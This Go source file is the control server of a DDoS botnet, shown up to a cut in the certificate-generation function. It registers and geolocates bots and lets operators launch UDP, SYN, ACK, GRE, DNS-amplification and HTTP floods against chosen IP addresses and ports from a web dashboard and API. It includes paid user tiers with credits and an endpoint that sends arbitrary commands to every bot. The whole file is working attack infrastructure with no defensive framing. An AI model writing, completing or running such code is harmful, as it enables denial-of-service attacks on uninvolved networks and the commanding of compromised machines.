package main

import (
	"bufio"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"io"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

type Config struct {
	UsersFile           string        `json:"users_file"`
	AuditLogFile        string        `json:"audit_log_file"`
	BotServerIP         string        `json:"bot_server_ip"`
	UserServerIP        string        `json:"user_server_ip"`
	WebServerIP         string        `json:"web_server_ip"`
	BotServerPort       string        `json:"bot_server_port"`
	UserServerPort      string        `json:"user_server_port"`
	WebServerPort       string        `json:"web_server_port"`
	CertFile            string        `json:"cert_file"`
	KeyFile             string        `json:"key_file"`
	SessionTimeout      time.Duration `json:"session_timeout"`
	MaxConns            int           `json:"max_conns"`
	MaxReadSize         int           `json:"max_read_size"`
	MaxLogSize          int64         `json:"max_log_size"`
	MaxQueuedAttacks    int           `json:"max_queued_attacks"`
	MaxDailyAttacks     int           `json:"max_daily_attacks"`
	MaxAttackDuration   int           `json:"max_attack_duration"`
	MaxSessionsPerUser  int           `json:"max_sessions_per_user"`
	MinPasswordLength   int           `json:"min_password_length"`
	PasswordComplexity  bool          `json:"password_complexity"`
	MaxConnectionsPerIP int           `json:"max_connections_per_ip"`
	DDOSProtection      bool          `json:"ddos_protection"`
	MaxConnRate         int           `json:"max_conn_rate"`
	SynFloodThreshold   int           `json:"syn_flood_threshold"`
	ResetTokenValidity  time.Duration `json:"reset_token_validity"`
	CommandSigningKey   string        `json:"command_signing_key"`
	BotCleanupInterval  time.Duration `json:"bot_cleanup_interval"`
	HeartbeatInterval   time.Duration `json:"heartbeat_interval"`
}

type User struct {
	Username       string        `json:"username"`
	PasswordHash   string        `json:"passwordHash"`
	APIKey         string        `json:"apiKey"`
	Expire         time.Time     `json:"expire"`
	Level          string        `json:"level"`
	LastLogin      time.Time     `json:"lastLogin"`
	FailedAttempts int           `json:"failedAttempts"`
	LockedUntil    time.Time     `json:"lockedUntil"`
	CreatedAt      time.Time     `json:"createdAt"`
	LastActivity   time.Time     `json:"lastActivity"`
	WalletAddress  string        `json:"walletAddress"` // Add this line
	Credits        int           `json:"credits"`       // Also add Credits field which is referenced
	Transactions   []Transaction `json:"transactions"`  // And Transactions if needed
}

type Transaction struct {
	Description string    `json:"description"`
	Time        time.Time `json:"time"`
	Amount      int       `json:"amount"`
	Status      string    `json:"status"`
}

type Bot struct {
	Arch          string    `json:"arch"`
	Conn          net.Conn  `json:"-"`
	IP            string    `json:"ip"`
	Time          time.Time `json:"time"`
	Country       string    `json:"country"`
	City          string    `json:"city"`
	Region        string    `json:"region"`
	Cores         int       `json:"cores"`
	RAM           float64   `json:"ram"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
}

type Attack struct {
	Method    string        `json:"method"`
	Target    string        `json:"target"`
	Port      string        `json:"port"`
	Duration  time.Duration `json:"duration"`
	Start     time.Time     `json:"start"`
	User      string        `json:"user"`
	Conn      net.Conn      `json:"-"`
	QueueTime time.Time     `json:"queueTime"`
	Priority  int           `json:"priority"`
	Signature string        `json:"signature"`
}

type AttackInfo struct {
	Method    string `json:"method"`
	Target    string `json:"target"`
	Port      string `json:"port"`
	Duration  string `json:"duration"`
	Remaining string `json:"remaining"`
	ID        string `json:"id"`
}

type Metrics struct {
	BotCount      int          `json:"botCount"`
	ActiveAttacks int          `json:"activeAttacks"`
	Attacks       []AttackInfo `json:"attacks"`
	Bots          []Bot        `json:"bots"`
}

type DashboardData struct {
	User           User
	BotCount       int
	OngoingAttacks []AttackInfo
	Bots           []Bot
	Users          []User
	FlashMessage   string
	BotsJSON       template.JS
}

type client struct {
	conn        net.Conn
	user        User
	sessionID   string
	lastCommand time.Time
	remoteAddr  string
	ctx         context.Context
	cancel      context.CancelFunc
}

type attackManager struct {
	attacks          map[net.Conn]Attack
	attackQueue      []Attack
	scheduledAttacks []Attack
	mutex            sync.RWMutex
}

type SessionStore struct {
	store sync.Map
}

type resetToken struct {
	username string
	token    string
	expires  time.Time
	used     bool
}

type BotStats struct {
	LastSeen     time.Time
	Latency      time.Duration
	Throughput   float64
	RAM          float64
	Cores        int
	Architecture string
}

type AggregatedStats struct {
	AvgLatency    time.Duration
	AvgThroughput float64
	TotalRAM      float64
	TotalCores    int
	HealthyBots   int
	UnhealthyBots int
}

var (
	cfg                   *Config
	bots                  []Bot
	botConns              []net.Conn
	attackManagerInstance = &attackManager{attacks: make(map[net.Conn]Attack)}
	sessions              = make(map[string]User)
	sessionStore          = &SessionStore{}
	serverStartTime       = time.Now()
	signingKey            []byte
	clients               []*client
	upgrader              = websocket.Upgrader{
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
	botConnLimiter   = rate.NewLimiter(rate.Every(5*time.Second), 1)
	loginRateLimiter = rate.NewLimiter(rate.Every(5*time.Minute), 5)
	ipLimiterMap     = make(map[string]*rateLimiter)
	userLimiterMap   = make(map[string]*rateLimiter)
	userSessions     = make(map[string]int)
	connSemaphore    chan struct{}
	blockedIPs       = make(map[string]time.Time)
	botPerformance   = make(map[string]BotStats)
	resetTokens      = struct {
		sync.RWMutex
		m map[string]resetToken
	}{m: make(map[string]resetToken)}
	allowedMethods = map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true, "!synflood": true,
		"!ackflood": true, "!greflood": true, "!dns": true, "!http": true,
	}
	reservedIPBlocks = []string{
		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
	}
	templates *template.Template
)

const (
	heartbeatInterval = 30 * time.Second
)

var (
	sessionLock     sync.Mutex
	botCountLock    sync.Mutex
	limiterMutex    sync.Mutex
	userSessionLock sync.Mutex
	blockedIPsLock  sync.Mutex
	botStatsLock    sync.Mutex
	logMutex        sync.Mutex
)

func main() {
	var err error
	cfg, err = loadConfig()
	if err != nil {
		fmt.Printf("Failed to load config: %v\n", err)
		os.Exit(1)
	}

	if err := validateConfig(); err != nil {
		fmt.Printf("Invalid config: %v\n", err)
		os.Exit(1)
	}

	signingKey = []byte(cfg.CommandSigningKey)
	connSemaphore = make(chan struct{}, cfg.MaxConns)

	if !fileExists(cfg.CertFile) || !fileExists(cfg.KeyFile) {
		generateSelfSignedCert()
	}

	if !fileExists(cfg.UsersFile) {
		initializeRootUser()
	}

	if err := initTemplates(); err != nil {
		log.Fatalf("Failed to initialize templates: %v", err)
	}

	go startBotServer()
	go startUserServer()
	go startBotCleanup()
	go startWebServer()
	go cleanSessions()
	go cleanRateLimiters()
	go cleanBlockedIPs()
	go rotateLogs()
	go updateTitle()
	go logSystemStats()
	go attackManagerInstance.checkScheduledAttacks()

	if cfg.DDOSProtection {
		go setupFirewallRules()
	}

	select {}
}

func initTemplates() error {
	funcMap := template.FuncMap{
		"FormatCredits": func(credits int) string {
			if credits < 0 {
				return "∞"
			}
			return fmt.Sprintf("%d", credits)
		},
		"getAttackPower":          getAttackPower,
		"GetMaxConcurrentAttacks": GetMaxConcurrentAttacks,
		"FormatMethodIcon": func(method string) template.HTML {
			icons := map[string]string{
				"!udpflood": "fa-bolt",
				"!udpsmart": "fa-brain",
				"!tcpflood": "fa-network-wired",
				"!synflood": "fa-sync",
				"!ackflood": "fa-reply",
				"!greflood": "fa-project-diagram",
				"!dns":      "fa-server",
				"!http":     "fa-globe",
			}
			if icon, ok := icons[method]; ok {
				return template.HTML(fmt.Sprintf(`<i class="fas %s"></i>`, icon))
			}
			return template.HTML(`<i class="fas fa-question"></i>`)
		},
		"FormatAttackMethodName": FormatAttackMethodName,
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
		"CalculateCreditCost": func(credits int) float64 { return float64(credits) / 1000.0 },
		"FormatDateTime":      func(t time.Time) string { return t.Format("2006-01-02 15:04:05") },
		"div": func(a, b uint64) float64 {
			if b == 0 {
				return 0
			}
			return float64(a) / float64(b)
		},
		"now":      func() time.Time { return time.Now() },
		"sub":      func(a, b uint64) uint64 { return a - b },
		"formatGB": func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
	}

	var err error
	templates, err = template.New("").Funcs(funcMap).ParseGlob("templates/*.html")
	return err
}

func startWebServer() {
	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", cfg.WebServerIP, cfg.WebServerPort),
		TLSConfig: &tls.Config{
			MinVersion:       tls.VersionTLS13,
			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
		},
	}

	http.HandleFunc("/", handleRoot)
	http.HandleFunc("/ws", requireAuth(handleWebSocket))
	http.HandleFunc("/login", handleLogin)
	http.HandleFunc("/dashboard", requireAuth(handleDashboard))
	http.HandleFunc("/admin-command", requireAuth(handleAdminCommand))
	http.HandleFunc("/attack", requireAuth(handleAttack))
	http.HandleFunc("/stop-all-attacks", requireAuth(handleStopAllAttacks))
	http.HandleFunc("/stop-attack", requireAuth(handleStopAttack))
	http.HandleFunc("/add-user", requireAuth(handleAddUserWeb))
	http.HandleFunc("/delete-user", requireAuth(handleDeleteUserWeb))
	http.HandleFunc("/logout", handleLogout)
	fs := http.FileServer(http.Dir("static"))
	http.Handle("/static/", http.StripPrefix("/static/", fs))
	http.HandleFunc("/api/bots", requireAuthAPI(handleAPIBots))
	http.HandleFunc("/api/attacks", requireAuthAPI(handleAPIAttacks))
	http.HandleFunc("/api/users", requireAuthAPI(handleAPIUsers))
	http.HandleFunc("/api/stats", requireAuthAPI(handleAPIStats))
	http.HandleFunc("/api/generate-key", requireAuthAPI(handleAPIGenerateKey))

	log.Fatal(server.ListenAndServeTLS(cfg.CertFile, cfg.KeyFile))
}

func handleRoot(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	sessionID := getSessionCookie(r)
	if _, exists := getSession(sessionID); exists {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	tmpl := template.Must(template.ParseFiles("templates/login.html"))
	tmpl.Execute(w, nil)
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")

	if exists, user := AuthUser(username, password); exists {
		newSessionID := randomString(64)
		oldSessionID := getSessionCookie(r)
		if oldSessionID != "" {
			clearSession(oldSessionID)
		}

		setSession(newSessionID, *user)
		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    newSessionID,
			Path:     "/",
			Secure:   true,
			HttpOnly: true,
			MaxAge:   3600,
			SameSite: http.SameSiteStrictMode,
		})

		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
	} else {
		tmpl := template.Must(template.ParseFiles("templates/login.html"))
		tmpl.Execute(w, struct{ Error string }{"Invalid username or password"})
	}
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	sessionID := getSessionCookie(r)
	if sessionID != "" {
		clearSession(sessionID)
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    "",
		Path:     "/",
		MaxAge:   -1,
		Secure:   true,
		HttpOnly: true,
		SameSite: http.SameSiteStrictMode,
	})

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleAdminCommand(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}

	command := r.FormValue("command")
	if command == "" {
		http.Error(w, "No command provided", http.StatusBadRequest)
		return
	}

	sendToBots(command, user.Username)
	w.Write([]byte("Command sent successfully"))
}

func handleAttack(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	method := r.FormValue("method")
	target := r.FormValue("ip")
	port := r.FormValue("port")
	duration := r.FormValue("duration")

	if !isValidMethod(method) {
		http.Redirect(w, r, "/dashboard?flash=Invalid attack method", http.StatusSeeOther)
		return
	}

	if !isValidIP(target) {
		http.Redirect(w, r, "/dashboard?flash=Invalid target IP/hostname", http.StatusSeeOther)
		return
	}

	if !isValidPort(port) {
		http.Redirect(w, r, "/dashboard?flash=Invalid port number", http.StatusSeeOther)
		return
	}

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 || dur > cfg.MaxAttackDuration {
		http.Redirect(w, r, "/dashboard?flash=Invalid duration", http.StatusSeeOther)
		return
	}

	if len(attackManagerInstance.attacks) >= cfg.MaxQueuedAttacks {
		http.Redirect(w, r, "/dashboard?flash=Maximum attack limit reached", http.StatusSeeOther)
		return
	}

	if method == "!dns" {
		portInt, _ := strconv.Atoi(port)
		if portInt != 53 {
			http.Redirect(w, r, "/dashboard?flash=DNS attacks must target port 53", http.StatusSeeOther)
			return
		}
	}

	attack := Attack{
		Method:    method,
		Target:    target,
		Port:      port,
		Duration:  time.Duration(dur) * time.Second,
		Start:     time.Now(),
		User:      user.Username,
		Signature: signCommand(fmt.Sprintf("%s %s %s %d", method, target, port, dur)),
	}

	attackManagerInstance.mutex.Lock()
	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
		attackManagerInstance.mutex.Unlock()
		http.Redirect(w, r, "/dashboard?flash=Attack queued", http.StatusSeeOther)
		return
	}
	attackManagerInstance.attacks[nil] = attack
	attackManagerInstance.mutex.Unlock()

	command := fmt.Sprintf("%s %s %s %d", method, target, port, dur)
	sendToBots(command, user.Username)

	http.Redirect(w, r, "/dashboard?flash=Attack launched successfully", http.StatusSeeOther)
}

func handleStopAllAttacks(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	attackManagerInstance.mutex.Lock()
	defer attackManagerInstance.mutex.Unlock()

	if len(attackManagerInstance.attacks) == 0 {
		http.Error(w, "No active attacks to stop", http.StatusBadRequest)
		return
	}

	attackManagerInstance.attacks = make(map[net.Conn]Attack)
	sendToBots("STOP ALL", user.Username)
	w.Write([]byte("All attacks stopped"))
}

func handleStopAttack(w http.ResponseWriter, r *http.Request, user User) {
	attackID := r.URL.Query().Get("id")
	if attackID == "" {
		http.Redirect(w, r, "/dashboard?flash=Invalid attack ID", http.StatusSeeOther)
		return
	}

	attackManagerInstance.mutex.Lock()
	defer attackManagerInstance.mutex.Unlock()

	for conn, attack := range attackManagerInstance.attacks {
		if attack.Method+"-"+attack.Target+"-"+attack.Port == attackID {
			sendToBots(fmt.Sprintf("STOP %s", attack.Target), user.Username)
			delete(attackManagerInstance.attacks, conn)
			http.Redirect(w, r, "/dashboard?flash=Attack stopped", http.StatusSeeOther)
			return
		}
	}

	http.Redirect(w, r, "/dashboard?flash=Attack not found", http.StatusSeeOther)
}

func handleAddUserWeb(w http.ResponseWriter, r *http.Request, user User) {
	if user.Level != "Owner" {
		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
		return
	}

	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")
	level := r.FormValue("level")

	if username == "" || password == "" || level == "" {
		http.Redirect(w, r, "/dashboard?flash=Missing user information", http.StatusSeeOther)
		return
	}

	if err := validatePassword(password); err != nil {
		http.Redirect(w, r, "/dashboard?flash="+url.QueryEscape(err.Error()), http.StatusSeeOther)
		return
	}

	users := getUsers()
	users = append(users, User{
		Username: username,
		PasswordHash: func() string {
			hash, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
			return string(hash)
		}(),
		APIKey:       randomString(64),
		Expire:       time.Now().AddDate(1, 0, 0),
		Level:        level,
		CreatedAt:    time.Now(),
		LastActivity: time.Now(),
	})

	saveUsers(users)
	http.Redirect(w, r, "/dashboard?flash=User added successfully", http.StatusSeeOther)
}

func handleDeleteUserWeb(w http.ResponseWriter, r *http.Request, user User) {
	if user.Level != "Owner" {
		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
		return
	}

	username := r.URL.Query().Get("username")
	if username == "" {
		http.Redirect(w, r, "/dashboard?flash=Invalid username", http.StatusSeeOther)
		return
	}

	if err := deleteUser(username); err != nil {
		http.Redirect(w, r, "/dashboard?flash=Error deleting user: "+err.Error(), http.StatusSeeOther)
		return
	}

	http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
}

func handleWebSocket(w http.ResponseWriter, r *http.Request, user User) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	ws.SetReadDeadline(time.Now().Add(90 * time.Second))
	ws.SetPongHandler(func(string) error { ws.SetReadDeadline(time.Now().Add(90 * time.Second)); return nil })

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		default:
			botCountLock.Lock()
			currentBots := getBots()
			activeBots := make([]Bot, 0)
			for _, b := range currentBots {
				if time.Since(b.LastHeartbeat) <= 2*cfg.HeartbeatInterval {
					activeBots = append(activeBots, b)
				}
			}
			botCountLock.Unlock()

			attackManagerInstance.mutex.RLock()
			attacks := make([]AttackInfo, 0, len(attackManagerInstance.attacks))
			for _, attack := range attackManagerInstance.attacks {
				remaining := time.Until(attack.Start.Add(attack.Duration))
				if remaining <= 0 {
					continue
				}
				attacks = append(attacks, AttackInfo{
					Method:    attack.Method,
					Target:    attack.Target,
					Port:      attack.Port,
					Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
					Remaining: formatDuration(remaining),
					ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
				})
			}
			attackManagerInstance.mutex.RUnlock()

			metrics := Metrics{
				BotCount:      len(activeBots),
				ActiveAttacks: len(attacks),
				Attacks:       attacks,
				Bots:          activeBots,
			}

			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
			if err := ws.WriteJSON(metrics); err != nil {
				return
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func handleDashboard(w http.ResponseWriter, r *http.Request, user User) {
	data := DashboardData{
		User:           user,
		BotCount:       getBotCount(),
		OngoingAttacks: getOngoingAttacks(),
		Bots:           getBots(),
		Users:          getUsers(),
	}

	botsJSON, _ := json.Marshal(data.Bots)
	data.BotsJSON = template.JS(botsJSON)

	if flash := r.URL.Query().Get("flash"); flash != "" {
		data.FlashMessage = flash
	}

	err := templates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Printf("Template error: %v", err)
	}
}

func handleAPIBots(w http.ResponseWriter, r *http.Request, user User) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(getBots())
}

func handleAPIAttacks(w http.ResponseWriter, r *http.Request, user User) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(getOngoingAttacks())
}

func handleAPIUsers(w http.ResponseWriter, r *http.Request, user User) {
	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(getUsers())
}

func handleAPIStats(w http.ResponseWriter, r *http.Request, user User) {
	stats := struct {
		BotCount      int     `json:"botCount"`
		ActiveAttacks int     `json:"activeAttacks"`
		Uptime        float64 `json:"uptime"`
	}{
		BotCount:      getBotCount(),
		ActiveAttacks: len(attackManagerInstance.attacks),
		Uptime:        time.Since(serverStartTime).Hours(),
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(stats)
}

func handleAPIGenerateKey(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	newKey := randomString(64)
	users := getUsers()
	for i := range users {
		if users[i].Username == user.Username {
			users[i].APIKey = newKey
			break
		}
	}
	saveUsers(users)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct{ APIKey string }{APIKey: newKey})
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID == "" {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		user, exists := getSession(sessionID)
		if !exists {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		handler(w, r, user)
	}
}

func requireAuthAPI(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		apiKey := r.Header.Get("X-API-Key")
		if apiKey == "" {
			http.Error(w, "API key required", http.StatusUnauthorized)
			return
		}
		users := getUsers()
		for _, u := range users {
			if u.APIKey == apiKey {
				handler(w, r, u)
				return
			}
		}
		http.Error(w, "Invalid API key", http.StatusUnauthorized)
	}
}

func startBotServer() {
	cert, _ := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", cfg.BotServerIP, cfg.BotServerPort), tlsConfig)
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleBotConnection(conn)
	}
}

func handleBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		return
	}
	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
	}()

	challenge, err := sendChallenge(conn)
	if err != nil {
		return
	}

	valid, err := verifyResponse(conn, challenge)
	if err != nil || !valid {
		return
	}

	incrementBotCount()

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	newBot := Bot{
		Conn:          conn,
		IP:            ip,
		Time:          time.Now(),
		LastHeartbeat: time.Now(),
	}

	country, city, _, _, _, err := getGeoLocation(ip)
	if err == nil {
		newBot.Country = country
		newBot.City = city
	}

	botCountLock.Lock()
	bots = append(bots, newBot)
	botConns = append(botConns, conn)
	botCountLock.Unlock()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		text := scanner.Text()
		conn.SetDeadline(time.Now().Add(cfg.HeartbeatInterval * 2))

		switch {
		case strings.HasPrefix(text, "PONG:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
		case strings.HasPrefix(text, "HEARTBEAT:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
			updateBotHeartbeat(conn)
		}
	}
}

func startUserServer() {
	tlsConfig := getTLSConfig()
	if tlsConfig == nil {
		return
	}

	listener, err := tls.Listen("tcp", cfg.UserServerIP+":"+cfg.UserServerPort, tlsConfig)
	if err != nil {
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleUserConnection(conn)
	}
}

func handleUserConnection(conn net.Conn) {
	defer func() {
		conn.Close()
		<-connSemaphore
		removeClient(conn)
	}()

	conn.SetDeadline(time.Now().Add(30 * time.Second))
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		return
	}

	if err := tlsConn.Handshake(); err != nil {
		return
	}

	remoteAddr := conn.RemoteAddr().String()
	logAuditEvent("SYSTEM", "CONNECTION", fmt.Sprintf("User connected from %s", remoteAddr))

	handleRequest(tlsConn)
}

func startBotCleanup() {
	ticker := time.NewTicker(cfg.BotCleanupInterval)
	defer ticker.Stop()
	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	threshold := 2 * cfg.HeartbeatInterval
	var activeBots []Bot
	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= threshold {
			activeBots = append(activeBots, b)
		} else if b.Conn != nil {
			b.Conn.Close()
		}
	}
	bots = activeBots
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		b[i] = chars[n.Int64()]
	}
	return string(b)
}

func isValidPort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	return err == nil && port > 0 && port <= 65535
}

func isValidMethod(method string) bool {
	return allowedMethods[method]
}

func isValidIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip != nil {
		if isPrivateIP(ip) {
			return !isPrivateIP(ip)
		}
		return true
	}

	if _, err := net.ResolveIPAddr("ip6", ipStr); err == nil {
		return true
	}

	if _, err := net.LookupHost(ipStr); err == nil {
		return true
	}

	return false
}

func isPrivateIP(ip net.IP) bool {
	privateBlocks := []*net.IPNet{
		{IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
		{IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("169.254.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("::1"), Mask: net.CIDRMask(128, 128)},
		{IP: net.ParseIP("fc00::"), Mask: net.CIDRMask(7, 128)},
		{IP: net.ParseIP("fe80::"), Mask: net.CIDRMask(10, 128)},
		{IP: net.ParseIP("224.0.0.0"), Mask: net.CIDRMask(4, 32)},
		{IP: net.ParseIP("240.0.0.0"), Mask: net.CIDRMask(4, 32)},
	}

	for _, block := range privateBlocks {
		if block.Contains(ip) {
			return true
		}
	}
	return false
}

func GetMaxConcurrentAttacks(userLevel string) int {
	switch userLevel {
	case "Owner":
		return 5
	case "Admin":
		return 5
	case "Pro":
		return 3
	case "Basic":
		return 1
	default:
		return 1
	}
}

func FormatAttackMethodName(method string) string {
	names := map[string]string{
		"!udpflood": "UDP Flood",
		"!udpsmart": "UDP Smart",
		"!tcpflood": "TCP Flood",
		"!synflood": "SYN Flood",
		"!ackflood": "ACK Flood",
		"!greflood": "GRE Flood",
		"!dns":      "DNS Amplification",
		"!http":     "HTTP Flood",
	}
	return names[method]
}

func getAttackPower(bots []Bot) float64 {
	totalPower := 0.0

	for _, bot := range bots {
		botPower := 0.0
		networkCapacity := float64(bot.Cores) * 70.0
		ramFactor := 1.0 + (bot.RAM / 16.0)
		archFactor := 1.0
		if strings.Contains(strings.ToLower(bot.Arch), "x86_64") {
			archFactor = 1.2
		} else if strings.Contains(strings.ToLower(bot.Arch), "arm") {
			archFactor = 0.7
		}

		connectionFactor := 1.0
		botPower = networkCapacity * ramFactor * archFactor * connectionFactor
		totalPower += botPower
	}

	totalGbps := totalPower / 1000
	return math.Round(totalGbps*100) / 100
}

func getBots() []Bot {
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}
	return activeBots
}

func getOngoingAttacks() []AttackInfo {
	var attacks []AttackInfo
	attackManagerInstance.mutex.RLock()
	defer attackManagerInstance.mutex.RUnlock()
	for _, attack := range attackManagerInstance.attacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining <= 0 {
			continue
		}
		attacks = append(attacks, AttackInfo{
			Method:    attack.Method,
			Target:    attack.Target,
			Port:      attack.Port,
			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
			Remaining: formatDuration(remaining),
			ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
		})
	}
	return attacks
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60
	if hours > 0 {
		return fmt.Sprintf("%dh%dm%ds", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm%ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func getSessionCookie(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func setSession(id string, user User) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	sessions[id] = user
}

func getSession(sessionID string) (User, bool) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	user, exists := sessions[sessionID]
	if !exists {
		return User{}, false
	}
	if time.Since(user.Expire) > cfg.SessionTimeout {
		delete(sessions, sessionID)
		return User{}, false
	}
	return user, true
}

func clearSession(id string) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	delete(sessions, id)
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
